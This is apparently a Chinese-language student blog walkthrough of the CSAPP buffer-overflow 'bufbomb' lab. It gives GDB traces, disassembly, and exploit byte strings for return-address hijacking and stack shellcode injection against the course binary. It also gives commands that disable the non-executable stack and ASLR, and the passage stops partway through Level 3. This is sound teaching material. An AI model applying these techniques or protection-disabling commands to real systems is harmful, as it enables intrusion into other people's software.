                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>
<p>GDB 的使用详见：<a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a>。这里新学一个命令：<code>examine</code> 查看内存地址中的值（简写为 <code>x</code>）。<code>x</code> 命令的语法如下所示：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1735947091" class="record">
            <header>
                <h1 class="record-title">CSAPP LAB-3 缓冲区溢出炸弹</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CSAPP');">CSAPP</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('ASM');">ASM</button>
                    
                    <button class="btn" onclick="activeTag('GDB');">GDB</button>
                    
                    <button class="btn" onclick="activeTag('objdump');">objdump</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/26/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240526153514.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>缓冲区溢出攻击实验</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>67787353</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>我发现我做的实验 3 和网上的都不太一样，难道这实验有新老版本之分？不过主题都是一致的：利用缓冲区溢出的漏洞进行攻击。</p>
<blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>
<p>如果你曾经做过 Lab2，那么阅读汇编代码将会很轻松。</p>
<h1>实验简介</h1>
<p>名称：缓冲区溢出炸弹</p>
<p>实验代码：</p>
<ul>
<li><code>makecookie</code>：生成 cookie，后续实验用到，以判断实验是否成功。例：<code>./makecookie SA18225155</code> 生成 cookie</li>
<li><code>bufbomb</code>：可执行程序 - 攻击对象</li>
<li><code>sendstring</code>: 字符格式转换</li>
</ul>
<h2>bufbomb 程序</h2>
<p><code>bufbomb</code> 中包含一个 <code>getbuf</code> 函数，该函数实现如下：</p>
<pre><code class="language-c">int getbuf() 
{ 
 	char buf[12]; 
	Gets(buf); 
	return 1; 
}
</code></pre>
<p>可以发现，这个函数对 buf 没有越界检查（这是常见的 c 编程错误），当输入超过 11 个字符将溢出。溢出的字符将覆盖栈帧上的数据，特别的，会覆盖程序调用的返回地址。这赋予我们控制程序流程的能力，我们可以通过构造溢出字符串，程序将“返回”至我们想要的代码上。</p>
<p>执行以下命令进行反汇编：</p>
<pre><code class="language-sh">objdump -d bufbomb &gt; bufbomb.s
</code></pre>
<p>观察汇编代码，结合栈帧结构进行理解：</p>
<pre><code class="language-d">08048fe0 &lt;getbuf&gt;:
 8048fe0:	55                   	push   %ebp         
 8048fe1:	89 e5                	mov    %esp,%ebp
 8048fe3:	83 ec 18             	sub    $0x18,%esp       # 缓冲区分配
 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax  # 请注意这一行
 8048fe9:	89 04 24             	mov    %eax,(%esp)
 8048fec:	e8 6f fe ff ff       	call   8048e60 &lt;Gets&gt;
 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax
 8048ff6:	c9                   	leave  
 8048ff7:	c3                   	ret    
 8048ff8:	90                   	nop
 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240526154709.webp" alt="image.png|300"></p>
<h2>sendstring 字符串转换程序</h2>
<p>它的功能是将 16 进制的数据转换为 ASCII 字符串。比如：<code>41 42 43</code> 转换为 <code>ABC</code>。</p>
<p>因为 <code>bufbomb</code> 接收的参数是 ASCII 字符串，我们输入的字符串使用了扩展的 ASCII 码（128~255）难以直接输入。</p>
<p>所以实验的基本流程为：</p>
<ul>
<li>在一个文件，如 <code>exploit.txt</code> 写好十六进制数据</li>
<li>执行命令得到字符文件：<code>./sendstring &lt; exploit.txt &gt; exploit-raw.txt </code></li>
<li>运行 bufbomb 程序：<code>bufbomb -t &lt;your_number&gt; &lt; exploit-raw.txt</code>。<code>&lt;your_number&gt;</code> 填写你的学号以验证 cookie。</li>
</ul>
<p>当然，我们也可以通过手动输入（从标准输入设备输入）的方式：<kbd>ALT</kbd>+ASC 码的十进制数（小键盘输入）。注意，最后一个数字按下后与 ALT 键同时放开。例如输入字符“1”为 ALT+49</p>
<blockquote>
<p>我感觉我们的实验时阉割版，不启用评分系统。和 Lab2 不一样的是，bufbomb 是运行 1 次解开对应 Level。如果有 4 个 Level 我们可能需要写 4 个 exploit.txt。但不管怎样，基本思路是一致的。</p>
</blockquote>
<h2>GDB</h2>
<p>GDB 的使用详见：<a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a>。这里新学一个命令：<code>examine</code> 查看内存地址中的值（简写为 <code>x</code>）。<code>x</code> 命令的语法如下所示：</p>
<p><code>x/&lt;n/f/u&gt; &lt;addr&gt;</code></p>
<p><code>n</code>、<code>f</code>、<code>u</code> 是可选的参数：</p>
<ul>
<li><code>n</code> 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</li>
<li><code>f</code> 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是 <code>s</code>，如果 地址是指令地址，那么格式可以是 i。</li>
<li><code>u</code> 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。<code>u</code> 参数可以用下面的字符来代替：<code>b</code> 表示单字节，<code>h</code> 表示双字节，<code>w</code> 表示四字 节，<code>g</code> 表示八字节。当我们指定了字节长度后，GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</li>
</ul>
<p>例子：</p>
<pre><code class="language-d">(gdb) x/48xb $ebp
0xffffba40:     0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7
0xffffba48:     0x0b    0x38    0xe3    0xf7    0x41    0x42    0x43    0x44
0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x00
0xffffba58:     0x78    0xba    0xff    0xff    0x1e    0x90    0x04    0x08
0xffffba60:     0x03    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08
0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7
</code></pre>
<h2>一些汇编指令参考</h2>
<p>不一定全都用到：</p>
<ul>
<li><code>call 地址</code>：返回地址入栈（等价于 <code>push %eip；mov 地址，%eip</code>；注意 <code>eip</code> 指向下一条尚未执行的指令）</li>
<li><code>ret</code>：从栈中弹出地址，并跳到那个地址（pop %eip）</li>
<li><code>leave</code>：使栈做好返回准备，等价于 <code>mov %ebp, %esp; pop %ebp</code></li>
<li><code>push</code>：<code>R[%esp]&lt;--R[%esp]-4;  M[R[%esp]]&lt;--S</code></li>
<li><code>pop</code>:  <code>D&lt;--M[R[%esp]];   R[%esp]&lt;--R[%esp]+4;</code></li>
</ul>
<h1>实验开始</h1>
<h2>Level 0 - 蜡烛</h2>
<blockquote>
<p>本层考察地址跳转。</p>
</blockquote>
<p>炸弹的主体函数 <code>test</code> 为：</p>
<pre><code class="language-c">void test() 
{ 
	int val; 
	volatile int local = 0xdeadbeef; 
	entry_check(3); /* Make sure entered this function properly */ 
	val = getbuf(); // getbuf函数在test中被调用，当getbuf返回时继续执行后续内容
	/* Check for corrupted stack */ 
	if (local != 0xdeadbeef) { 
		printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;); 
	} 
	else if (val == cookie) { 
		...	
}
</code></pre>
<p>正常运行的结果为：</p>
<pre><code>Type string: &lt;随便输入小于11个字符的字符串&gt;
Better luck next time
</code></pre>
<p><code>smoke</code> 是 <code>bufbomb</code> 中一个正常情况下不会被执行的函数：</p>
<pre><code class="language-c">void smoke() 
{ 
	entry_check(0); /* Make sure entered this function properly */ 
	printf(&quot;Smoke!: You called smoke()\n&quot;); 
	validate(0); 
	exit(0); 
} 
</code></pre>
<p>我们的目标：在 <code>getbuf</code> 返回时跳到 <code>smoke</code> 函数执行。</p>
<p>思路：</p>
<ul>
<li>通过调试得到我们输入的字符串首地址，并打印出该字符串作验证 <code>x/s $ebp-0xc</code></li>
<li>找到函数 <code>smoke</code> 的地址 <code>p/x &amp;smoke</code>；或者直接在反编译文件中搜索 <code>smoke</code> 函数地址即可。</li>
<li>用 <code>smoke</code> 函数的地址覆盖 <code>getbuf</code> 的返回地址。</li>
</ul>
<p>我们先简单测试一个不会造成缓冲区溢出的正常字符串：<code>41 42 43 44 45 46 47 48 49 4a 4b</code> 11 个字符加上末尾 <code>\0</code>。</p>
<p>GDB 调试，在 getbuf 函数返回前，检查%esp：</p>
<pre><code class="language-d">; (gdb) p /x $esp
; $2 = 0xffffba40  ⏩

(gdb) p /x $ebp
$9 = 0xffffba58  ▶ 

; (gdb) x/48xb $esp
; 0xffffba40:⏩  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7
; 0xffffba48:     0x0b    0x38    0xe3    0xf7    😀0x41    0x42    0x43    0x44
; 0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x00😉
; 0xffffba58:▶  0x78    0xba    0xff    0xff    ❤0x1e    0x90    0x04    0x08❤ 
; 0xffffba60:     0x03    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08
; 0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7
</code></pre>
<p>😀标记处，也就是汇编代码中的 <code>-0xc(%ebp)</code> 就是缓冲区开始地址。😉标记缓冲区结束的位置。</p>
<p>❤标记的 <code>0x1e    0x90    0x04    0x08</code> 是地址 <code>0x0804901e</code> 小端编码后的结果，指向返回 test 地址（因为 test 调用 getbuf）。</p>
<p>那我们利用缓冲区溢出取覆盖掉这个地址就行，让他指向 smoke 函数。观察反汇编的代码 <code>bufbomb.s</code> 容易知道 smoke 函数地址为：<code>0x08048e20</code>，小端写法：<code>20 8e 04 08</code>。所以，<code>exploit0.txt</code> 为：</p>
<pre><code class="language-txt">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 20 8e 04 08
</code></pre>
<p>gdb 重新运行 bufbomb 我们可以观察注入后的栈帧：</p>
<pre><code class="language-d">; 注入后：
; (gdb) x/48xb $esp
; 0xffffba40:⏩  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7
; 0xffffba48:     0x0b    0x38    0xe3    0xf7    😀0x41    0x42    0x43    0x44
; 0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
; 0xffffba58:▶  0xff    0xff    0xff    0xff    ❤0x20    0x8e    0x04    0x08❤
; 0xffffba60:     0x00    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08
; 0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7
</code></pre>
<p>运行结果如下：</p>
<pre><code>Type string:Smoke!: You called smoke()
</code></pre>
<h2>Level 1 - 烟火</h2>
<blockquote>
<p>本层考察函数传参。</p>
</blockquote>
<p>bufbomb 存在另一个函数 fizz：</p>
<pre><code class="language-c">void fizz(int val) 
{ 
	entry_check(1); /* Make sure entered this function properly */ 
if (val == cookie) { 
	printf(&quot;Fizz!: You called fizz(0x%x)\n&quot;, val);  // 我们必须运行到这里
	validate(1); 
} else 
	printf(&quot;Misfire: You called fizz(0x%x)\n&quot;, val); 
	exit(0); 
} 
</code></pre>
<p>目标：“返回”到该函数并传送参数 cookie。Cookie 为上文提到的 <code>makecookie</code> 程序结合自己学号生成 <code>./makecookie SA08225155</code>。</p>
<p>fizz  的地址为  <code>0x08048dc0</code>，小端写法：<code>c0 8d 04 08</code>。所以参照 Level 0，得到 exploit 的基本写法为：</p>
<pre><code>41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08
</code></pre>
<p>继续阅读反汇编代码：</p>
<pre><code class="language-d">08048dc0 &lt;fizz&gt;:
 8048dc0:	55                   	push   %ebp
 8048dc1:	89 e5                	mov    %esp,%ebp
 8048dc3:	53                   	push   %ebx
 8048dc4:	83 ec 14             	sub    $0x14,%esp
 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx      #  不要看错为-0x8(%ebp)
 # 0x8(%ebp)  0x8049ac7 -&gt; 
;  (gdb) p (char*) 0x8049ac7
; $99 = 0x8049ac7 &quot;Type string:&quot;
 8048dca:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048dd1:	e8 ca fb ff ff       	call   80489a0 &lt;entry_check&gt;
 8048dd6:	3b 1d cc a1 04 08    	cmp    0x804a1cc,%ebx      #  0x804a1cc 存储的是cookie字符串 0x2ac98515 对应我的学号
 8048ddc:	74 22                	je     8048e00 &lt;fizz+0x40&gt;  # 要想成功，必须相等
 8048dde:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 8048de2:	c7 04 24 98 98 04 08 	movl   $0x8049898,(%esp)    # 传入字符串：&quot;Misfire: You called fizz(0x%x)\n&quot;
;  (gdb) p (char*) 0x8049898
; $53 = 0x8049898 &quot;Misfire: You called fizz(0x%x)\n&quot;  
 8048de9:	e8 76 f9 ff ff       	call   8048764 &lt;printf@plt&gt;

 8048dee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048df5:	e8 aa f9 ff ff       	call   80487a4 &lt;exit@plt&gt;
 8048dfa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

 8048e00:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 8048e04:	c7 04 24 29 9a 04 08 	movl   $0x8049a29,(%esp) # 传入字符串&quot; Fizz!: You called fizz(0x%x)\n&quot;
;  (gdb) p (char*) 0x8049a29
; $54 = 0x8049a29 &quot;Fizz!: You called fizz(0x%x)\n&quot; &lt;- 这个才是成功的
 8048e0b:	e8 54 f9 ff ff       	call   8048764 &lt;printf@plt&gt;
 8048e10:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048e17:	e8 c4 fc ff ff       	call   8048ae0 &lt;validate&gt;
 8048e1c:	eb d0                	jmp    8048dee &lt;fizz+0x2e&gt;
 8048e1e:	89 f6                	mov    %esi,%esi
</code></pre>
<p>我们知道，要想成功，必须在跳转到 <code>fizz</code> 函数后，传入参数（参数值为自己的 cookie）。这个参数保存在 <code>0x8(%ebp)</code> 中。老方法，直接覆盖即可：</p>
<pre><code>41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08 ee ee ee ee 15 85 c9 2a
</code></pre>
<pre><code class="language-d">(gdb) p /x $esp
$1 = 0xffffba44

(gdb) p /x $ebp
$2 = 0xffffba5c

(gdb) x/60xb $esp
0xffffba44:⏩  0x74    0x2b    0xdf    0xf7    0x0b    0x38    0xe3    0xf7
0xffffba4c:     0x41    0x42    0x43    0x44    0x45    0x46    0x47    0x48
0xffffba54:     0x49    0x4a    0x4b    0x4c    0x00    0x00    0x00    0x00
0xffffba5c:▶   0xff    0xff    0xff    0xff    0xee    0xee    0xee    0xee
0xffffba64:     ❤0x15    0x85    0xc9    0x2a❤    0x00    0xba    0xff    0xff
0xffffba6c:     0x60    0x90    0xf2    0xf7    0x86    0x91    0xf2    0xf7
0xffffba74:     0xef    0xbe    0xad    0xde    0x98    0xcc    0xff    0xff
0xffffba7c:     0x05    0x91    0x04    0x08
</code></pre>
<p>运行结果如下：</p>
<pre><code>Type string:Fizz!: You called fizz(0x2ac98515)
</code></pre>
<h2>Level 2 - 鞭炮【选做】</h2>
<blockquote>
<p>本层考察指令注入。</p>
</blockquote>
<p>这一层我们需要跳转到另一个函数：</p>
<pre><code class="language-c">int global_value = 0; 
void bang(int val) 
{ 
	entry_check(2); /* Make sure entered this function properly */ 
	if (global_value == cookie) { 
		printf(&quot;Bang!: You set global_value to 0x%x\n&quot;, global_value); // 必须执行到这里
		validate(2); 
	} else 
		printf(&quot;Misfire: global_value = 0x%x\n&quot;, global_value); 
	exit(0); 
}
</code></pre>
<p>与上一层的不同点在于这个函数检查的是全局变量，全局变量存储在一个特定的地址中。</p>
<p>观察反汇编后的代码：</p>
<pre><code class="language-d">08048d60 &lt;bang&gt;:
 8048d60:	55                   	push   %ebp
 8048d61:	89 e5                	mov    %esp,%ebp
 8048d63:	83 ec 08             	sub    $0x8,%esp
 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
 8048d6d:	e8 2e fc ff ff       	call   80489a0 &lt;entry_check&gt;
 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax   # 全局变量存放地址（我们需要修改）
;  (gdb) p /x *0x804a1dc
; $5 = 0x0
 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax   # cookie存放地址
;  (gdb) p /x *0x804a1cc
; $6 = 0x2ac98515 
 8048d7d:	74 21                	je     8048da0 &lt;bang+0x40&gt;
 8048d7f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048d83:	c7 04 24 0b 9a 04 08 	movl   $0x8049a0b,(%esp)
 8048d8a:	e8 d5 f9 ff ff       	call   8048764 &lt;printf@plt&gt;
 8048d8f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048d96:	e8 09 fa ff ff       	call   80487a4 &lt;exit@plt&gt;
 8048d9b:	90                   	nop
 8048d9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 8048da0:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048da4:	c7 04 24 70 98 04 08 	movl   $0x8049870,(%esp)
 8048dab:	e8 b4 f9 ff ff       	call   8048764 &lt;printf@plt&gt;
 8048db0:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
 8048db7:	e8 24 fd ff ff       	call   8048ae0 &lt;validate&gt;
 8048dbc:	eb d1                	jmp    8048d8f &lt;bang+0x2f&gt;
 8048dbe:	89 f6                	mov    %esi,%esi
</code></pre>
<p>程序取全局变量的地址为 <code>0x804a1dc</code>，这个地址初始值为 0。程序计算好的 cookie 放在 <code>0x804a1cc</code>，会和全局变量进行比较。我们的任务是实现修改全局变量，我们这时候就需要构造指令，注入代码了。</p>
<p>构造指令的步骤：</p>
<ol>
<li>写一小段汇编程序 <code>level2.s</code></li>
<li>编译：<code>gcc -c level2.s </code></li>
<li>反汇编得到字节码：<code>objdump -d level2.o &gt; level2.d</code></li>
</ol>
<p>这段代码如何执行？前面两个实验已经实现了跳转到某个函数地址执行代码，我们可以使其跳转到缓冲区中，执行我们注入的指令。</p>
<p>但是在默认的情况下，栈中的内容不可执行（课本好像讲过相关内容），我们需要使用工具 <code>execstack</code> 接触栈执行的限制：</p>
<pre><code class="language-sh">sudo apt-get install execstack # 安装 execstack
execstack -s bufbomb                  # 亲测，GDB做到这一步就行
sysctl -w kernel.randomize_va_space=0 # 关闭ASLR（地址空间随机化）命令
</code></pre>
<blockquote>
<p>如果不解除限制，后续实验可能会报段错误。</p>
</blockquote>
<p>下面编写 <code>level2.s</code>：</p>
<pre><code class="language-d">movl $0x2ac98515,0x804a1dc
movl $0x08048d60,(%rsp)
ret

</code></pre>
<blockquote>
<p>注意汇编代码文件末尾有空行，否则有警告：warning: end of file not at end of a line; newline inserted</p>
</blockquote>
<p>上面的汇编代码做了几件事情：</p>
<ol>
<li>把 cookie 放入全局变量（<code>0x804a1dc</code>）中</li>
<li>把 bang 的函数地址压栈</li>
<li>返回。（弹栈跳转到指定地址）</li>
</ol>
<p>使用反汇编工具得到的字节码如下：</p>
<pre><code class="language-d">
level2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:	c7 04 25 dc a1 04 08 	movl   $0x2ac98515,0x804a1dc
   7:	15 85 c9 2a 
   b:	c7 04 24 60 8d 04 08 	movl   $0x8048d60,(%rsp)
  12:	c3                   	retq   

</code></pre>
<p>因此我们的指令字节为：<code>c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3</code></p>
<p>这里先给出本层答案，然后看下面的说明就能理解：</p>
<pre><code>41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 60 ba ff ff c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3 
</code></pre>
<p>执行 <code>getbuff</code> 函数结束前，我们需要看一下栈的地址以便确定跳转到哪里：</p>
<pre><code class="language-d">(gdb) p /x $esp
$1 = 0xffffba40   ⏩

(gdb) p /x $ebp
$2 = 0xffffba58   ▶

(gdb) x/64xb $esp
0xffffba40:⏩  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7
0xffffba48:     0x0b    0x38    0xe3    0xf7    😀0x41    0x42    0x43    0x44
0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c😉
0xffffba58:▶  0xff    0xff    0xff    0xff    ❤0x60    0xba    0xff    0xff❤
0xffffba60:   ☢0xc7    0x04    0x25    0xdc    0xa1    0x04    0x08    0x15
0xffffba68:     0x85    0xc9    0x2a    0xc7    0x04    0x24    0x60    0x8d
0xffffba70:     0x04    0x08    0xc3☢    0x00    0xef    0xbe    0xad    0xde
0xffffba78:     0x98    0xcc    0xff    0xff    0x05    0x91    0x04    0x08
</code></pre>
<p>上面内容是不是很熟悉，在 Level0 中出现过。😀😉标记就是程序分配的 12 个字节缓冲区，❤标记的是跳转到的目标地址。☢标记的是注入的指令。</p>
<p>因此❤中应填写：<code>0xffffba60</code> 对应的小端编码。</p>
<p>程序结果为：</p>
<pre><code>Type string:Bang!: You set global_value to 0x2ac98515
</code></pre>
<h2>Level 3 - 炸药【选做】</h2>
<blockquote>
<p>本层为综合发散考察。</p>
</blockquote>
<p>关于本层的提示，在上面 3 层的答案中，我们用 <code>ff ff ff ff</code> 把 <code>%ebp</code> 的值覆盖掉了。但这一层不太一样，它会检测 <code>%ebp</code> 的值是否改动。</p>
<p>首先给出了完整的 test 函数：</p>
<pre><code class="language-c">void test() 
{ 
	int val; 
	volatile int local = 0xdeadbeef; 
	entry_check(3); /* Make sure entered this function properly */ 
	val = getbuf(); 
	/* Check for corrupted stack */ 
	if (local != 0xdeadbeef) { 
		printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;); 
	} 
	else if (val == cookie) { 
		printf(&quot;Boom!: getbuf returned 0x%x\n&quot;, val);   // 我们需要进入到这里
		validate(3); 
	} 
	else { 
		printf(&quot;Dud: getbuf returned 0x%x\n&quot;, val); 
	} 
}
</code></pre>
<p>要点：</p>
<ol>
<li><code>val</code> 是 <code>getbuf()</code> 的返回值，我们需要修改这个返回值为我们的 cookie</li>
<li>保证程序在取 <code>local</code> 时能正确取到魔数 <code>0xdeadbeef</code></li>
</ol>
<p>观察 test 汇编代码：</p>
<pre><code class="language-d">08049000 &lt;test&gt;:
 8049000:	55                   	push   %ebp
 8049001:	89 e5                	mov    %esp,%ebp
 8049003:	83 ec 18             	sub    $0x18,%esp
 8049006:	c7 45 fc ef be ad de 	movl   $0xdeadbeef,-0x4(%ebp) ; %ebp: 0xffffba78
 804900d:	c7 04 24 03 00 00 00 	movl   $0x3,(%esp)
 8049014:	e8 87 f9 ff ff       	call   80489a0 &lt;entry_check&gt;
 8049019:	e8 c2 ff ff ff       	call   8048fe0 &lt;getbuf&gt;
 804901e:	89 c2                	mov    %eax,%edx        # %edx 存储 getbuf 返回值
 8049020:	8b 45 fc             	mov    -0x4(%ebp),%eax  # local = -0x4(%ebp)
 8049023:	3d ef be ad de       	cmp    $0xdeadbeef,%eax
 8049028:	74 0e                	je     8049038 &lt;test+0x38&gt; # 必须相等
 804902a:	c7 04 24 b8 98 04 08 	movl   $0x80498b8,(%esp)
;  (gdb) p (char*) 0x80498b8
; $10 = 0x80498b8 &quot;Sabotaged!: the stack has been corrupted&quot;
 8049031:	e8 de f6 ff ff       	call   8048714 &lt;puts@plt&gt;
 8049036:	c9                   	leave  
 8049037:	c3                   	ret    
 8049038:	3b 15 cc a1 04 08    	cmp    0x804a1cc,%edx #  0x804a1cc 存储的是cookie字符串 0x2ac98515 对应我的学号
 804903e:	74 12                	je     8049052 &lt;test+0x52&gt;  # 必须相等
 8049040:	89 54 24 04          	mov    %edx,0x4(%esp)
 8049044:	c7 04 24 9b 9a 04 08 	movl   $0x8049a9b,(%esp)
;  (gdb) p (char*) 0x8049a9b
; $11 = 0x8049a9b &quot;Dud: getbuf returned 0x%x\n&quot;
 804904b:	e8 14 f7 ff ff       	call   8048764 &lt;printf@plt&gt;
 8049050:	c9                   	leave  
 8049051:	c3                   	ret    
 8049052:	89 54 24 04          	mov    %edx,0x4(%esp)
 8049056:	c7 04 24 7e 9a 04 08 	movl   $0x8049a7e,(%esp) #  &lt;- 目标字符串
;  (gdb) p (char*) 0x8049a7e
; $12 = 0x8049a7e &quot;Boom!: getbuf returned 0x%x\n&quot;
 804905d:	e8 02 f7 ff ff       	call   8048764 &lt;printf@plt&gt;
